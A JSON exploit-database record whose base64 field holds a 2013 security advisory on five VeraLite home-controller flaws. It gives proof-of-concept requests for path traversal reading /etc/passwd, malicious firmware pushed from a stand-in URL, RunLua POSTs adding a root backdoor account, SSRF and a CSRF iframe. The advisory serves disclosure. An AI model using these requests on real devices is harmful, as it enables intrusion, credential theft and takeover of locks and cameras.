{
    "source": "exploit-database", 
    "exploit": "VHJ1c3R3YXZlIFNwaWRlckxhYnMgU2VjdXJpdHkgQWR2aXNvcnkgVFdTTDIwMTMtMDE5Og0KTXVsdGlwbGUgVnVsbmVyYWJpbGl0aWVzIGluIE1pQ2FzYVZlcmRlIFZlcmFMaXRlDQoNClB1Ymxpc2hlZDogMDgvMDEvMTMNClZlcnNpb246IDEuMA0KDQpWZW5kb3I6IE1pQ2FzYVZlcmRlIChodHRwOi8vd3d3Lm1pY2FzYXZlcmRlLmNvbS8pDQpQcm9kdWN0OiBWZXJhTGl0ZQ0KVmVyc2lvbiBhZmZlY3RlZDogIDEuNS40MDgNCg0KUHJvZHVjdCBkZXNjcmlwdGlvbjoNClRoZSBNaUNhc2FWZXJkZSBWZXJhTGl0ZSBpcyB0aGUgYnVkZ2V0IG1vZGVsIGZyb20gTWlDYXNhVmVyZGUsIGEgcHJvZHVjdA0Kd2hpY2ggY2VudHJhbGl6ZXMgY29udHJvbCBvdmVyIGhvbWUgYXV0b21hdGlvbiBkZXZpY2VzIHN1Y2ggYXMgZG9vciBsb2NrcywNCndpbmRvdyBibGluZHMsIHNlY3VyaXR5IGNhbWVyYXMsIHNtb2tlIGRldGVjdG9ycywgSFZBQyBzeXN0ZW1zLCBsaWdodHMsDQpldGMuDQoNCkZpbmRpbmcgMTogUGF0aCBUcmF2ZXJzYWwNCioqKioqQ3JlZGl0OiBEYW5pZWwgQ3Jvd2xleSBvZiBUcnVzdHdhdmUgU3BpZGVyTGFicw0KQ1ZFOiBDVkUtMjAxMy00ODYxDQpDV0U6IENXRS0yMw0KDQpUaGUgVmVyYUxpdGUgaGFzIGEgcGF0aCB0cmF2ZXJzYWwgdnVsbmVyYWJpbGl0eSBhbGxvd2luZyBmb3IgZGlzY2xvc3VyZSBvZg0KYXJiaXRyYXJ5IGZpbGVzLiBUaGlzIGFsbG93cyBhbiBhdHRhY2tlciB0byByZXRyaWV2ZSB0aGUgY29udGVudHMgb2YgYW55DQpmaWxlIG9uIHRoZSBzeXN0ZW0gc3VjaCBhcyB0aGUgL2V0Yy9wYXNzd2QgZmlsZSB3aGljaCBjb250YWlucyB0aGUgaGFzaGVkDQpyb290IHBhc3N3b3JkIGFzIHdlbGwgYXMgdGhlIHRlY2ggc3VwcG9ydCByZW1vdGUgYWNjZXNzIHBhc3N3b3JkIGlmIHJlbW90ZQ0KYWNjZXNzIGhhcyBiZWVuIGNvbmZpZ3VyZWQuDQoNCkEgcHJvb2Ygb2YgY29uY2VwdCBjYW4gYmUgcnVuIGFnYWluc3QgYSBWZXJhTGl0ZSBieSB1c2luZyB0aGUgZm9sbG93aW5nIFVSTDoNCkdFVCBodHRwOi8vQS5CLkMuRC9jZ2ktYmluL2NtaC9nZXRfZmlsZS5zaD9maWxlbmFtZT0uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkDQoNCk9uIGEgbmV3bHkgdW5ib3hlZCBWZXJhTGl0ZSwgdGhpcyBzaG91bGRuJ3Qgd29yayBhcyB0aGUgZmlyc3QgcGFydCBvZiB0aGUNCnBhdGggdXNlZCBieSB0aGUgc2NyaXB0IGRvZXNuJ3QgZXhpc3QsIGJ1dCB0aGUgZGlyZWN0b3J5IHdoaWNoIG11c3QgZXhpc3QNCmZvciBleHBsb2l0YXRpb24gdG8gd29yayBjb3JyZWN0bHkgY2FuIGJlIGNyZWF0ZWQgYnkgdXNpbmcgdGhlDQpzdG9yZV9maWxlLnNoIHNjcmlwdCwgbGlrZSBzbzoNCg0KR0VUIGh0dHA6Ly9BLkIuQy5EL2NnaS1iaW4vY21oL3N0b3JlX2ZpbGUuc2g/c3RvcmVfZmlsZT10ZXN0DQoNClRoaXMgYXR0YWNrIGNhbiBhbHNvIGJlIGxhdW5jaGVkIHRocm91Z2ggdGhlIEludGVybmV0LWJhc2VkIGNvbnRyb2wgcGFuZWwNCmF0IGNwLm1pb3MuY29tIHdoZW4gbG9nZ2VkIGluIGFzIGVpdGhlciBhbiBhZG1pbiBvciBndWVzdCBsZXZlbCBhY2NvdW50Lg0KDQpGaW5kaW5nIDI6IEluc3VmZmljaWVudCBBdXRob3JpemF0aW9uIENoZWNrcw0KKioqKipDcmVkaXQ6IERhbmllbCBDcm93bGV5IG9mIFRydXN0d2F2ZSBTcGlkZXJMYWJzDQpDVkU6IENWRS0yMDEzLTQ4NjINCkNXRTogQ1dFLTI4NQ0KDQpUaGUgVmVyYUxpdGUgbWFrZXMgYSBkaXN0aW5jdGlvbiBiZXR3ZWVuIEFkbWluaXN0cmF0b3IgYW5kIEd1ZXN0IHVzZXJzIHN1Y2gNCnRoYXQgR3Vlc3QgdXNlcnMgc2hvdWxkIG5vdCBiZSBhYmxlIHRvIG1ha2UgY2hhbmdlcyB0byB0aGUgY29uZmlndXJhdGlvbiBvZg0KdGhlIHN5c3RlbS4gVGhlcmUgYXJlIHNldmVyYWwgZnVuY3Rpb25hbGl0aWVzIGluY2x1ZGVkIGluIHRoZSBWZXJhTGl0ZQ0KY29uc29sZSBhdmFpbGFibGUgdG8gR3Vlc3QgbGV2ZWwgdXNlcnMgd2hpY2ggY2FuIGJlIHVzZWQgdG8gZXNjYWxhdGUNCnByaXZpbGVnZXMuDQoNCkEpIEZpcm13YXJlIHVwZGF0ZSAtIFRoaXMgYWxsb3dzIGEgZ3Vlc3QgdG8gcHVzaCBjdXN0b20gZmlybXdhcmUgdG8gdGhlDQp1bml0IGFuZCBjYW4gYWxsb3cgZm9yIGZ1bGwgY29tcHJvbWlzZSBvZiB0aGUgZGV2aWNlLg0KDQpBIHByb29mIG9mIGNvbmNlcHQgY2FuIGJlIHNlZW4gdXNpbmcgdGhlIGZvbGxvd2luZyBVUkw6DQpHRVQgaHR0cDovL0EuQi5DLkQvdXBncmFkZV9zdGVwMi5zaD9zcXVhc2hmcz1odHRwOi8vZXhhbXBsZS5jb20vZXZpbF92ZXJhX2Zpcm13YXJlLnNxdWFzaGZzDQoNCkIpIFNldHRpbmdzIGJhY2t1cCAtIFRoaXMgYWxsb3dzIGEgZ3Vlc3QgdG8gb2J0YWluIGNvcGllcyBvZiB2YXJpb3VzDQpzZW5zaXRpdmUgZmlsZXMsIGluY2x1ZGluZyB0aGUgbGlnaHR0cGQudXNlcnMgZmlsZSB3aGljaCBjb250YWlucyBoYXNoZWQNCmNwLm1pb3MuY29tIHBhc3N3b3JkcywgYW5kIHRoZSBwYXNzd2QgZmlsZSB3aGljaCBjb250YWlucyB0aGUgaGFzaGVkIHJvb3QNCnBhc3N3b3JkLg0KDQpHRVQgaHR0cDovL0EuQi5DLkQvY2dpLWJpbi9jbWgvYmFja3VwLnNoP2V4dGVybmFsPTENCg0KQykgVGVzdCBMdXVwIGNvZGUgKEx1YSkgLSBUaGlzIGFsbG93cyBhIGd1ZXN0IHRvIHJ1biBMdWEgY29kZSBvbiB0aGUNClZlcmFMaXRlIGFzIHJvb3QuIEEgYmFja2Rvb3IgYWNjb3VudCBjYW4gYmUgYWRkZWQgd2l0aCB0aGUgZm9sbG93aW5nIFBPU1QNCnJlcXVlc3Q6DQoNClBPU1QgL3BvcnRfNDk0NTEvdXBucC9jb250cm9sL2hhZyBIVFRQLzEuMQ0KSG9zdDogQS5CLkMuRA0KQWNjZXB0OiB0ZXh0L2phdmFzY3JpcHQsIHRleHQvaHRtbCwgYXBwbGljYXRpb24veG1sLCB0ZXh0L3htbCwgKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLXVzLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpYLVByb3RvdHlwZS1WZXJzaW9uOiAxLjcNCkNvbnRlbnQtVHlwZTogdGV4dC94bWw7Y2hhcnNldD1VVEYtOA0KTUlNRS1WZXJzaW9uOiAxLjANClNPQVBBQ1RJT046ICJ1cm46c2NoZW1hcy1taWNhc2F2ZXJkZS1vcmc6c2VydmljZTpIb21lQXV0b21hdGlvbkdhdGV3YXk6MSNSdW5MdWEiDQpDb250ZW50LUxlbmd0aDogMzExDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpQcmFnbWE6IG5vLWNhY2hlDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KDQo8czpFbnZlbG9wZSBzOmVuY29kaW5nU3R5bGU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3NvYXAvZW5jb2RpbmcvIiB4bWxuczpzPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyI+PHM6Qm9keT4gICAgPHU6UnVuTHVhIHhtbG5zOnU9InVybjpzY2hlbWFzLW1pY2FzYXZlcmRlLW9yZzpzZXJ2aWNlOkhvbWVBdXRvbWF0aW9uR2F0ZXdheToxIj4gICAgICAgIDxEZXZpY2VOdW0+PC9EZXZpY2VOdW0+IDxDb2RlPm9zLmV4ZWN1dGUoImVjaG8gJ2JhY2tkb29yJTNhJTNhMCUzYTAlM2FCYWNrZG9vciBSb290IEFjY291bnQlM2EvdG1wJTNhL2Jpbi9hc2gnICUzZSUzZSAvZXRjL3Bhc3N3ZCIpPC9Db2RlPiAgICA8L3U6UnVuTHVhPjwvczpCb2R5PjwvczpFbnZlbG9wZT4NCg0KDQpGaW5kaW5nIDM6IEluc3VmZmljaWVudCBBdXRoZW50aWNhdGlvbiBDaGVja3MNCioqKioqQ3JlZGl0OiBEYW5pZWwgQ3Jvd2xleSBvZiBUcnVzdHdhdmUgU3BpZGVyTGFicw0KQ1ZFOiBDVkUtMjAxMy00ODYzDQpDV0U6IENXRS0yODcNCg0KVGhlIFZlcmFMaXRlIGV4cG9zZXMgVVBuUCBmdW5jdGlvbmFsaXR5IHdoaWNoIGFsbG93cyBmb3IgTHVhIGNvZGUgdG8gYmUgcnVuDQphcyByb290IGZyb20gdGhlIExBTiB3aXRob3V0IGF1dGhlbnRpY2F0aW9uIHVzaW5nIHRoZSBSdW5MdWEgYWN0aW9uIGluIHRoZQ0KSG9tZUF1dG9tYXRpb25HYXRld2F5IHNlcnZpY2Ugb2YgdGhlIEhvbWVBdXRvbWF0aW9uR2F0ZXdheSBkZXZpY2UuIEENCmJhY2tkb29yIGFjY291bnQgY2FuIGJlIGFkZGVkIHdpdGggdGhlIGZvbGxvd2luZyBQT1NUIHJlcXVlc3QgdG8gcG9ydA0KNDk0NTE6DQoNClBPU1QgL3VwbnAvY29udHJvbC9oYWcgSFRUUC8xLjENCkhvc3Q6IEEuQi5DLkQ6NDk0NTENCkFjY2VwdDogdGV4dC9qYXZhc2NyaXB0LCB0ZXh0L2h0bWwsIGFwcGxpY2F0aW9uL3htbCwgdGV4dC94bWwsICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbi11cyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KWC1Qcm90b3R5cGUtVmVyc2lvbjogMS43DQpDb250ZW50LVR5cGU6IHRleHQveG1sO2NoYXJzZXQ9VVRGLTgNCk1JTUUtVmVyc2lvbjogMS4wDQpTT0FQQUNUSU9OOiAidXJuOnNjaGVtYXMtbWljYXNhdmVyZGUtb3JnOnNlcnZpY2U6SG9tZUF1dG9tYXRpb25HYXRld2F5OjEjUnVuTHVhIg0KQ29udGVudC1MZW5ndGg6IDMxMQ0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNCg0KPHM6RW52ZWxvcGUgczplbmNvZGluZ1N0eWxlPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VuY29kaW5nLyIgeG1sbnM6cz0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvc29hcC9lbnZlbG9wZS8iPjxzOkJvZHk+ICAgIDx1OlJ1bkx1YSB4bWxuczp1PSJ1cm46c2NoZW1hcy1taWNhc2F2ZXJkZS1vcmc6c2VydmljZTpIb21lQXV0b21hdGlvbkdhdGV3YXk6MSI+ICAgICAgICA8RGV2aWNlTnVtPjwvRGV2aWNlTnVtPiA8Q29kZT5vcy5leGVjdXRlKCJlY2hvICdiYWNrZG9vciUzYSUzYTAlM2EwJTNhQmFja2Rvb3IgUm9vdCBBY2NvdW50JTNhL3RtcCUzYS9iaW4vYXNoJyAlM2UlM2UgL2V0Yy9wYXNzd2QiKTwvQ29kZT4gICAgPC91OlJ1bkx1YT48L3M6Qm9keT48L3M6RW52ZWxvcGU+DQoNCkZpbmRpbmcgNDogU2VydmVyLVNpZGUgUmVxdWVzdCBGb3JnZXJ5DQoqKioqKkNyZWRpdDogRGFuaWVsIENyb3dsZXkgb2YgVHJ1c3R3YXZlIFNwaWRlckxhYnMNCkNWRTogQ1ZFLTIwMTMtNDg2NA0KQ1dFOiBDV0UtOTE4DQoNClRoZSBWZXJhTGl0ZSB3aWxsIG1ha2UgSFRUUCByZXF1ZXN0cyBvbiBiZWhhbGYgb2YgYSB1c2VyIHVzaW5nIHRoZQ0KL2NnaS1iaW4vY21oL3Byb3h5LnNoIHNjcmlwdC4gQSBwcm9vZiBvZiBjb25jZXB0IHRvIHB1bGwgdGhlIGhvbWVwYWdlIG9mDQp0cnVzdHdhdmUuY29tIGlzIGFzIGZvbGxvd3M6DQoNCkdFVCBodHRwOi8vQS5CLkMuRC9jZ2ktYmluL2NtaC9wcm94eS5zaD91cmw9aHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbQ0KDQpUaGlzIGFsbG93cyBhbiBhdHRhY2tlciB0byBieXBhc3MgZmlyZXdhbGwgY29udHJvbHMsIHVzZSB0aGUgVmVyYUxpdGUgYXMgYSBwcm94eQ0KDQoNCkZpbmRpbmcgNTogQ3Jvc3MtU2l0ZSBSZXF1ZXN0IEZvcmdlcnkNCioqKioqQ3JlZGl0OiBEYW5pZWwgQ3Jvd2xleSBvZiBUcnVzdHdhdmUgU3BpZGVyTGFicw0KQ1ZFOiBDVkUtMjAxMy00ODY1DQpDV0U6IENXRS0zNTINCg0KVGhlIFZlcmFMaXRlIGRvZXMgbm90IGltcGxlbWVudCBhbnkgZGVmZW5zZSBhZ2FpbnN0IGNyb3NzLXNpdGUgcmVxdWVzdA0KZm9yZ2VyeS4gQSBwcm9vZiBvZiBjb25jZXB0IGFzIHNlZW4gYmVsb3cgY2FuIGNhdXNlIGEgVmVyYSB1c2VyIHRvIHVwZGF0ZQ0KdGhlaXIgZmlybXdhcmUgdXNpbmcgYSBjdXN0b20gZmlybXdhcmUgVVJMOg0KDQo8aHRtbD4NCjxib2R5Pg0KPGlmcmFtZSBzcmM9Imh0dHA6Ly9BLkIuQy5EL3VwZ3JhZGVfc3RlcDIuc2g/c3F1YXNoZnM9aHR0cDovL2V4YW1wbGUuY29tL2V2aWxfdmVyYV9maXJtd2FyZS5zcXVhc2hmcyIgd2lkdGg9IjEiIGhlaWdodD0iMSI+DQo8L2lmcmFtZT4NCjwvYm9keT4NCjwvaHRtbD4NCg0KSWYgdGhpcyBQb0Mgd2FzIGVtYmVkZGVkIGluIGFueSB3ZWIgcGFnZSBhIHRhcmdldGVkIHVzZXIgdmlzaXRlZCwgYW4NCmF0dGFja2VyIHdvdWxkIGJlIGFibGUgdG8gbWFrZSBhcmJpdHJhcnkgY2hhbmdlcyB0byB0aGUgZmlybXdhcmUgb24gdGhlDQpkZXZpY2UsIGFsbG93aW5nIHRoZSBwb3RlbnRpYWwgZm9yIHJlbW90ZSByb290IGFjY2Vzcy4NCg0KVmVuZG9yIFJlc3BvbnNlOg0KIi4uLnRoZSAidnVsbmVyYWJpbGl0aWVzIiB5b3UgcmVmZXJyZWQgdG8gd2VyZSBkZWxpYmVyYXRlIGRlc2lnbiBkZWNpc2lvbnMNCmJlY2F1c2UgdGhhdCdzIHdoYXQgdGhlIGN1c3RvbWVycyBpbiB0aGlzIHBhcnRpY3VsYXIgY2hhbm5lbCAoaWUgVmVyYQ0KcmV0YWlsKSB3YW50LiAgQXMgeW91IGNhbiBzZWUgd2UgaGF2ZSBhbiBvcGVuIGZvcnVtIHRvIGRpc2N1c3MgdGhpcywgYW5kDQp2ZXJ5IHBlb3BsZSBvYmplY3QgdG8gbGVhdmluZyBWZXJhIG9wZW4uICBTbyB3ZSBhcmUgbm90IGFibGUgdG8gbG9jayBkb3duDQp0aGUgZ2F0ZXdheSwgYW5kIGVmZmVjdGl2ZWx5IGJyZWFrIHRoZSBzeXN0ZW1zIG9mIG1hbnkgY3VzdG9tZXJzIHdobyByZWx5DQpvbiB0aGUgb3BlbiBzeXN0ZW0gdG8gcnVuIHRoZWlyIG93biBzY3JpcHRzIGFuZCBwbHVnaW5zLiINCg0KUmVtZWRpYXRpb24gU3RlcHM6DQpObyBvZmZpY2lhbCBwYXRjaCBpcyBhdmFpbGFibGUuICBUbyBsaW1pdCBleHBvc3VyZSwNCm5ldHdvcmsgYWNjZXNzIHRvIHRoZXNlIGRldmljZXMgc2hvdWxkIGJlIGxpbWl0ZWQgdG8gYXV0aG9yaXplZA0KcGVyc29ubmVsIHRocm91Z2ggdGhlIHVzZSBvZiBhY2Nlc3MgY29udHJvbCBsaXN0cyBhbmQgcHJvcGVyDQpuZXR3b3JrIHNlZ21lbnRhdGlvbi4NCg0KUmV2aXNpb24gSGlzdG9yeToNCjA0LzIzLzEzIC0gVnVsbmVyYWJpbGl0eSBkaXNjbG9zZWQgdG8gdmVuZG9yDQowNi8wNC8xMyAtIFZlbmRvciBjb25maXJtcyB0aGV5IHdpbGwgbm90IGZpeA0KMDgvMDEvMTMgLSBBZHZpc29yeSBwdWJsaXNoZWQNCg0KDQpSZWZlcmVuY2VzDQoxLiBodHRwOi8vd3d3Lm1pY2FzYXZlcmRlLmNvbS8NCg0KDQpBYm91dCBUcnVzdHdhdmU6DQpUcnVzdHdhdmUgaXMgdGhlIGxlYWRpbmcgcHJvdmlkZXIgb2Ygb24tZGVtYW5kIGFuZCBzdWJzY3JpcHRpb24tYmFzZWQNCmluZm9ybWF0aW9uIHNlY3VyaXR5IGFuZCBwYXltZW50IGNhcmQgaW5kdXN0cnkgY29tcGxpYW5jZSBtYW5hZ2VtZW50DQpzb2x1dGlvbnMgdG8gYnVzaW5lc3NlcyBhbmQgZ292ZXJubWVudCBlbnRpdGllcyB0aHJvdWdob3V0IHRoZSB3b3JsZC4gRm9yDQpvcmdhbml6YXRpb25zIGZhY2VkIHdpdGggdG9kYXkncyBjaGFsbGVuZ2luZyBkYXRhIHNlY3VyaXR5IGFuZCBjb21wbGlhbmNlDQplbnZpcm9ubWVudCwgVHJ1c3R3YXZlIHByb3ZpZGVzIGEgdW5pcXVlIGFwcHJvYWNoIHdpdGggY29tcHJlaGVuc2l2ZQ0Kc29sdXRpb25zIHRoYXQgaW5jbHVkZSBpdHMgZmxhZ3NoaXAgVHJ1c3RLZWVwZXIgY29tcGxpYW5jZSBtYW5hZ2VtZW50DQpzb2Z0d2FyZSBhbmQgb3RoZXIgcHJvcHJpZXRhcnkgc2VjdXJpdHkgc29sdXRpb25zLiBUcnVzdHdhdmUgaGFzIGhlbHBlZA0KdGhvdXNhbmRzIG9mIG9yZ2FuaXphdGlvbnMtLXJhbmdpbmcgZnJvbSBGb3J0dW5lIDUwMCBidXNpbmVzc2VzIGFuZCBsYXJnZQ0KZmluYW5jaWFsIGluc3RpdHV0aW9ucyB0byBzbWFsbCBhbmQgbWVkaXVtLXNpemVkIHJldGFpbGVycy0tbWFuYWdlDQpjb21wbGlhbmNlIGFuZCBzZWN1cmUgdGhlaXIgbmV0d29yayBpbmZyYXN0cnVjdHVyZSwgZGF0YSBjb21tdW5pY2F0aW9ucyBhbmQNCmNyaXRpY2FsIGluZm9ybWF0aW9uIGFzc2V0cy4gVHJ1c3R3YXZlIGlzIGhlYWRxdWFydGVyZWQgaW4gQ2hpY2FnbyB3aXRoDQpvZmZpY2VzIHRocm91Z2hvdXQgTm9ydGggQW1lcmljYSwgU291dGggQW1lcmljYSwgRXVyb3BlLCBBZnJpY2EsIENoaW5hIGFuZA0KQXVzdHJhbGlhLiBGb3IgbW9yZSBpbmZvcm1hdGlvbiwgdmlzaXQgaHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbQ0KDQpBYm91dCBUcnVzdHdhdmUgU3BpZGVyTGFiczoNClNwaWRlckxhYnMoUikgaXMgdGhlIGFkdmFuY2VkIHNlY3VyaXR5IHRlYW0gYXQgVHJ1c3R3YXZlIGZvY3VzZWQgb24NCmFwcGxpY2F0aW9uIHNlY3VyaXR5LCBpbmNpZGVudCByZXNwb25zZSwgcGVuZXRyYXRpb24gdGVzdGluZywgcGh5c2ljYWwNCnNlY3VyaXR5IGFuZCBzZWN1cml0eSByZXNlYXJjaC4gVGhlIHRlYW0gaGFzIHBlcmZvcm1lZCBvdmVyIGEgdGhvdXNhbmQNCmluY2lkZW50IGludmVzdGlnYXRpb25zLCB0aG91c2FuZHMgb2YgcGVuZXRyYXRpb24gdGVzdHMgYW5kIGh1bmRyZWRzIG9mDQphcHBsaWNhdGlvbiBzZWN1cml0eSB0ZXN0cyBnbG9iYWxseS4gSW4gYWRkaXRpb24sIHRoZSBTcGlkZXJMYWJzIFJlc2VhcmNoDQp0ZWFtIHByb3ZpZGVzIGludGVsbGlnZW5jZSB0aHJvdWdoIGJsZWVkaW5nLWVkZ2UgcmVzZWFyY2ggYW5kIHByb29mIG9mDQpjb25jZXB0IHRvb2wgZGV2ZWxvcG1lbnQgdG8gZW5oYW5jZSBUcnVzdHdhdmUncyBwcm9kdWN0cyBhbmQgc2VydmljZXMuDQpodHRwczovL3d3dy50cnVzdHdhdmUuY29tL3NwaWRlcmxhYnMNCg0KRGlzY2xhaW1lcjoNClRoZSBpbmZvcm1hdGlvbiBwcm92aWRlZCBpbiB0aGlzIGFkdmlzb3J5IGlzIHByb3ZpZGVkICJhcyBpcyIgd2l0aG91dA0Kd2FycmFudHkgb2YgYW55IGtpbmQuIFRydXN0d2F2ZSBkaXNjbGFpbXMgYWxsIHdhcnJhbnRpZXMsIGVpdGhlciBleHByZXNzIG9yDQppbXBsaWVkLCBpbmNsdWRpbmcgdGhlIHdhcnJhbnRpZXMgb2YgbWVyY2hhbnRhYmlsaXR5IGFuZCBmaXRuZXNzIGZvciBhDQpwYXJ0aWN1bGFyIHB1cnBvc2UuIEluIG5vIGV2ZW50IHNoYWxsIFRydXN0d2F2ZSBvciBpdHMgc3VwcGxpZXJzIGJlIGxpYWJsZQ0KZm9yIGFueSBkYW1hZ2VzIHdoYXRzb2V2ZXIgaW5jbHVkaW5nIGRpcmVjdCwgaW5kaXJlY3QsIGluY2lkZW50YWwsDQpjb25zZXF1ZW50aWFsLCBsb3NzIG9mIGJ1c2luZXNzIHByb2ZpdHMgb3Igc3BlY2lhbCBkYW1hZ2VzLCBldmVuIGlmDQpUcnVzdHdhdmUgb3IgaXRzIHN1cHBsaWVycyBoYXZlIGJlZW4gYWR2aXNlZCBvZiB0aGUgcG9zc2liaWxpdHkgb2Ygc3VjaA0KZGFtYWdlcy4gU29tZSBzdGF0ZXMgZG8gbm90IGFsbG93IHRoZSBleGNsdXNpb24gb3IgbGltaXRhdGlvbiBvZiBsaWFiaWxpdHkNCmZvciBjb25zZXF1ZW50aWFsIG9yIGluY2lkZW50YWwgZGFtYWdlcyBzbyB0aGUgZm9yZWdvaW5nIGxpbWl0YXRpb24gbWF5IG5vdA0KYXBwbHkuDQoNCl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fDQoNClRoaXMgdHJhbnNtaXNzaW9uIG1heSBjb250YWluIGluZm9ybWF0aW9uIHRoYXQgaXMgcHJpdmlsZWdlZCwgY29uZmlkZW50aWFsLCBhbmQvb3IgZXhlbXB0IGZyb20gZGlzY2xvc3VyZSB1bmRlciBhcHBsaWNhYmxlIGxhdy4gSWYgeW91IGFyZSBub3QgdGhlIGludGVuZGVkIHJlY2lwaWVudCwgeW91IGFyZSBoZXJlYnkgbm90aWZpZWQgdGhhdCBhbnkgZGlzY2xvc3VyZSwgY29weWluZywgZGlzdHJpYnV0aW9uLCBvciB1c2Ugb2YgdGhlIGluZm9ybWF0aW9uIGNvbnRhaW5lZCBoZXJlaW4gKGluY2x1ZGluZyBhbnkgcmVsaWFuY2UgdGhlcmVvbikgaXMgU1RSSUNUTFkgUFJPSElCSVRFRC4gSWYgeW91IHJlY2VpdmVkIHRoaXMgdHJhbnNtaXNzaW9uIGluIGVycm9yLCBwbGVhc2UgaW1tZWRpYXRlbHkgY29udGFjdCB0aGUgc2VuZGVyIGFuZCBkZXN0cm95IHRoZSBtYXRlcmlhbCBpbiBpdHMgZW50aXJldHksIHdoZXRoZXIgaW4gZWxlY3Ryb25pYyBvciBoYXJkIGNvcHkgZm9ybWF0Lg==", 
    "filename": "platforms/hardware/webapps/27286.txt", 
    "id": "27286", 
    "cves": [
        "CVE-2013-4863", 
        "CVE-2013-4862", 
        "CVE-2013-4861", 
        "CVE-2013-4865", 
        "CVE-2013-4864"
    ]
}